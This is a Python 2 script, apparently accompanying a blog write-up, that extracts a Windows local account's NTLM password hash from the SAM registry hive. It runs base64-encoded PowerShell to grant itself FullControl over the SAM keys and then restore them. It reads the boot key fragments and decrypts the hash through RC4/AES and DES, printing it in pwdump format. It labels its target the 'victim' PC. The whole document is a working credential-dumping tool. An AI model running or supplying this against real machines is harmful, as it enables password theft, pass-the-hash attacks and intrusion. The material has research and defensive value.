#!python2.7
#!/usr/bin/env python
'''
I interpreted and reused code from:
https://github.com/rapid7/rex-powershell/blob/master/spec/file_fixtures/powerdump.ps1
As of Win10 v1607 (>10.0.14393), the HASH encoding changed ...
Accompanying blog post: http://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/
'''
print('#################### By Tijl Deneut ###########################')
print('This scripts requires \'pycrypto\' to run (which requires http://aka.ms/vcpython27 on Windows)')
print('This is the version to automatically extract the data, please run as administrator!!')
## What I need from you:
# > User RID (e.g. for Administrator this is '500' or '0x1F4', other users start at 1001), can be found with
# wmic useraccount where name='Administrator' get sid
RID = 500
print('The Hash to extract is for user RID ' + str(RID) + '. Please adjust the code when needed.')
raw_input('Press Enter to continue')

import binascii, md5, os, base64
os.system('cls' if os.name == 'nt' else 'clear')

def getRegistryValues(HexRID):
    from subprocess import Popen, PIPE
    from ctypes import c_uint, c_char_p, byref, windll
    def RegOpenKeyEx(subkey):
        hkey = c_uint(0) ## Initialize to an int
        windll.advapi32.RegOpenKeyExA(0x80000002, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\' + subkey, 0, 0x19, byref(hkey))
        return hkey.value
    def RegQueryInfoKey(hkey):
        classname = c_char_p('aabbccdd') ## Initialize to 4 bytes
        windll.advapi32.RegQueryInfoKeyA(hkey,classname,byref(c_uint(1024)),None,None,None,None,None,None,None,None,0)
        return classname.value
    def RegCloseKey(subkey):
        windll.advapi32.RegCloseKey(subkey)
        return
    def getRegClass(subkey):
        hKey = RegOpenKeyEx(subkey) ## Open Registry Key and get handle
        value = RegQueryInfoKey(hKey) ## Read out the Class Name
        RegCloseKey(hKey) ## Close key
        return value
    print('##### -- Hold on, retrieving registry data, may take some seconds -- #####')
    ## AddPermissionsForSAMDump
    addpermissions = '''$rule = New-Object System.Security.AccessControl.RegistryAccessRule([System.Security.Principal.WindowsIdentity]::GetCurrent().Name,"FullControl",[System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",[System.Security.AccessControl.PropagationFlags]"None",[System.Security.AccessControl.AccessControlType]"Allow"); $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SAM\SAM\Domains",[Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,[System.Security.AccessControl.RegistryRights]::ChangePermissions); $acl = $key.GetAccessControl(); $acl.SetAccessRule($rule); $key.SetAccessControl($acl); '''
    os.system('powershell -enc '+base64.b64encode(addpermissions.encode('utf_16_le')))
    ## Get RegistryHash
    proc=Popen('reg query hklm\\sam\\sam\\domains\\account\\users\\'+HexRID+' /v V', shell=True, stdout=PIPE)
    try: HexRegHash = proc.stdout.readlines()[2].replace(' ','').split('REG_BINARY')[1]
    except:
        print('Error: Script needs to be run as Administrator!')
        raw_input('Press Enter to exit')
        exit()
    proc=Popen(r'reg query "hklm\SAM\SAM\Domains\Account" /v F | find "BINARY"', shell=True, stdout=PIPE)
    HexRegSysk = proc.stdout.readlines()[0].replace(' ','').split('REG_BINARY')[1]
    ## FixPermissionsForSAMDump
    fixpermissions = '''$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SAM\SAM\Domains",[Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,[System.Security.AccessControl.RegistryRights]::ChangePermissions); $acl = $key.GetAccessControl(); $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name; $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null; Set-Acl HKLM:\SAM\SAM\Domains $acl'''
    os.system('powershell -enc '+base64.b64encode(fixpermissions.encode('utf_16_le')))
    ## Use Windows API to get Class Values for JD, Skew1, GBG and Data
    jd = getRegClass('JD')
    skew1 = getRegClass('Skew1')
    gbg = getRegClass('GBG')
    data = getRegClass('Data')
    return str(HexRegHash.strip()), str(HexRegSysk.strip()), jd, skew1, gbg, data

## Data and key as hex string ('ABCDEFGH')
def decryptRC4(data, key):
    data = binascii.unhexlify(data)
    key = binascii.unhexlify(key)
    S = range(256)
    j = 0
    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i] , S[j] = S[j] , S[i]
    i = 0
    j = 0
    result=''
    for char in data:
        i = ( i + 1 ) % 256
        j = ( j + S[i] ) % 256
        S[i] , S[j] = S[j] , S[i]
        result += chr(ord(char) ^ S[(S[i] + S[j]) % 256])
    return binascii.hexlify(result)

## Data and key as hex string ('ABCDEFGH')
def decryptAES(data, key, salt):
    try: from Crypto.Cipher import AES
    except:
        print('Error: Crypto not found, please run "pip install pycrypto" as admin')
        raw_input('Press Enter to exit')
        exit()
    data = binascii.unhexlify(data)
    key = binascii.unhexlify(key)
    salt = binascii.unhexlify(salt)
    cipher = AES.new(key, AES.MODE_CBC, salt)
    return binascii.hexlify(cipher.decrypt(data))

## Data and key as hex string ('ABCDEFGH')
def decryptDES(data, key):
    try: from Crypto.Cipher import DES
    except:
        print('Error: Crypto not found, please run "pip install pycrypto" as admin')
        raw_input('Press Enter to exit')
        exit()
    data = binascii.unhexlify(data)
    key = binascii.unhexlify(key)
    cipher = DES.new(key, DES.MODE_ECB)
    return binascii.hexlify(cipher.decrypt(data))

def str_to_key(dessrc):
    bkey = binascii.unhexlify(dessrc)
    keyarr = []
    for i in range(0,len(bkey)): keyarr.append(int(binascii.hexlify(bkey[i]),16))
    bytearr = []
    bytearr.append(keyarr[0]>>1)
    bytearr.append(((keyarr[0] & 0x01) << 6) | keyarr[1] >> 2)
    bytearr.append(((keyarr[1] & 0x03) << 5) | keyarr[2] >> 3)
    bytearr.append(((keyarr[2] & 0x07) << 4) | keyarr[3] >> 4)
    bytearr.append(((keyarr[3] & 0x0F) << 3) | keyarr[4] >> 5)
    bytearr.append(((keyarr[4] & 0x1F) << 2) | keyarr[5] >> 6)
    bytearr.append(((keyarr[5] & 0x3F) << 1) | keyarr[6] >> 7)
    bytearr.append(keyarr[6]&0x7F)
    result = ''
    for b in bytearr:
        bit = bin(b*2)[2:].zfill(8)
        if bit.count('1')% 2  == 0: ## Even parity so RMB bitflip needed
            result += hex((b * 2) ^ 1)[2:].zfill(2)
        else:
            result += hex(b * 2)[2:].zfill(2)
    return result

######## This part is to be run on the "victim" PC #######
HexRID = hex(RID)[2:].zfill(8) ## 500 becomes '000001f4'
HexRegHash, HexRegSysk, jd, skew1, gbg, data = getRegistryValues(HexRID)

################# MAIN FUNCTION IN STEPS #################
RegHash = binascii.unhexlify(HexRegHash)
UsernameOffset = int(binascii.hexlify(RegHash[0xc]), 16) + 0xcc
UsernameLength = int(binascii.hexlify(RegHash[0xc+4]),16)
Username = RegHash[UsernameOffset:UsernameOffset+UsernameLength].replace('\x00','')
print('Username (offset 0xc): ' + Username + "\n")

print('####### ---- STEP1, extract the double encrypted NTLM Hash ---- #######')
Offset = HexRegHash[0xA8*2:(0xA8+4)*2] ## Offset like 'a0010000'
HexOffset = "0x"+"".join(map(str.__add__, Offset[-2::-2], Offset[-1::-2])) ## Offset like '0x1a0'
NTOffset = int(HexOffset,16)+int("0xcc",16) ## Offset like 0x1a0+0xcc=0x26c
Length = HexRegHash[0xAC*2:(0xAC+4)*2] ## Length like '14000000'
HexLength = "0x"+"".join(map(str.__add__, Length[-2::-2], Length[-1::-2])) ## Length like '0x14'
Length=int(HexLength,16) ## Length like 0x14 (pre 1607) or 0x38 (since 1607)
print('Offset is '+hex(NTOffset)+' and length is '+hex(Length))
Hash = HexRegHash[(NTOffset+4)*2: (NTOffset+4+Length)*2][:32] ## Only 16 bytes needed
if hex(Length)=='0x38':
    print('Detected New Style Hash (AES), need IV')
    Hash = HexRegHash[(NTOffset + 24) * 2: (NTOffset + 24 + Length) * 2][:32] ## Only 16 bytes needed
    IV = HexRegHash[(NTOffset + 8) *2:(NTOffset + 24) * 2] ## IV needed to AES decrypt later
    print('NT IV: ' + IV)
elif not hex(Length)=='0x14':
    print('Error: Length not 0x14, user probably has no password?')
    raw_input('Press Enter to close')
    exit()
print('Double encrypted Hash should be ' + Hash + "\n") ## D4442D6644EDAE736D4F3DFB8FF04F0F


print('####### ---- STEP2, Combine the hBootKey ---- #######')
Scrambled = jd + skew1 + gbg + data
hBootkey = Scrambled[8*2:8*2+2]+Scrambled[5*2:5*2+2]+Scrambled[4*2:4*2+2]+Scrambled[2*2:2*2+2]
hBootkey += Scrambled[11*2:11*2+2]+Scrambled[9*2:9*2+2]+Scrambled[13*2:13*2+2]+Scrambled[3*2:3*2+2]
hBootkey += Scrambled[0*2:0*2+2]+Scrambled[6*2:6*2+2]+Scrambled[1*2:1*2+2]+Scrambled[12*2:12*2+2]
hBootkey += Scrambled[14*2:14*2+2]+Scrambled[10*2:10*2+2]+Scrambled[15*2:15*2+2]+Scrambled[7*2:7*2+2]
print("Your hBootkey/Syskey should be " + hBootkey + "\n") ## 5a6c489141f82ca35d05593fce33b996

print('####### ---- STEP3, use hBootKey to RC4/AES decrypt Syskey ---- #######')
hBootVersion = int(HexRegSysk[0x00:(0x00+1)*2], 16) ## First byte contains version
if hBootVersion==3: ## AES encrypted!
    print('Detected New Style hBootkey Hash too (AES), needs IV')
    hBootIV = HexRegSysk[0x78*2:(0x78+16)*2] ## 16 Bytes iv
    encSysk = HexRegSysk[0x88*2:(0x88+32)*2][:32] ## Only 16 bytes needed
    Syskey = decryptAES(encSysk, hBootkey, hBootIV)
else:
    Part = binascii.unhexlify(HexRegSysk[0x70*2:(0x70+16)*2])
    Qwerty = '!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%'+"\x00"
    hBootkey = binascii.unhexlify(hBootkey)
    Digits = '0123456789012345678901234567890123456789'+"\x00"
    RC4Key = binascii.hexlify(md5.new(Part + Qwerty + hBootkey + Digits).digest())
    encSysk = HexRegSysk[0x80*2:(0x80+32)*2][:32]  ## Only 16 bytes needed
    Syskey = decryptRC4(encSysk, RC4Key)
print('Your Full Syskey/SAMKey should be ' + Syskey + "\n")

print('####### ---- STEP4, use SAM-/Syskey to RC4/AES decrypt the Hash ---- #######')
HexRID = hex(RID)[2:].zfill(8) ## 500 becomes '000001f4'
HexRID = binascii.unhexlify("".join(map(str.__add__, HexRID[-2::-2], HexRID[-1::-2]))) ## '000001f4' becomes 'f4010000'
if hex(Length)=='0x14': ## RC4 Encrypted Hash
    NTPASSWORD = 'NTPASSWORD'+"\x00"
    SYSKEY = binascii.unhexlify(Syskey)
    HashRC4Key = binascii.hexlify(md5.new(SYSKEY+HexRID+NTPASSWORD).digest())
    EncryptedHash = decryptRC4(Hash, HashRC4Key) ## Hash from STEP1, RC4Key from step 3 (76f1327b198c0731ae2611dab42716ea)
if hex(Length)=='0x38': ## AES Encrypted Hash
    EncryptedHash = decryptAES(Hash, Syskey, IV) #494e7ccb2dad245ec2094db427a37ebf6731aed779271e6923cb91a7f6560b0d
print('Your encrypted Hash should be ' + EncryptedHash + "\n") ## a291d14b768a6ac455a0ab9d376d8551

print('####### ---- STEP5, use DES derived from RID to fully decrypt the Hash ---- #######')
DESSOURCE1 = binascii.hexlify(HexRID[0] + HexRID[1] + HexRID[2] + HexRID[3] + HexRID[0] + HexRID[1] + HexRID[2]) ##f4010000 becomes f4010000f40100
DESSOURCE2 = binascii.hexlify(HexRID[3] + HexRID[0] + HexRID[1] + HexRID[2] + HexRID[3] + HexRID[0] + HexRID[1])
## Nextup: The DESSOURCEs above are converted from 7 byte to 8 byte keys (using Odd Parity):
DESKEY1 = str_to_key(DESSOURCE1)
DESKEY2 = str_to_key(DESSOURCE2)
DecryptedHash = decryptDES(EncryptedHash[:16], DESKEY1) + decryptDES(EncryptedHash[16:], DESKEY2)
print('Your decrypted NTLM Hash should be ' + DecryptedHash) ## 32ed87bdb5fdc5e9cba88547376818d4 which is '123456'
print(str(RID)+':aad3b435b51404eeaad3b435b51404ee:'+DecryptedHash+"\n")
raw_input('All done, press Enter')
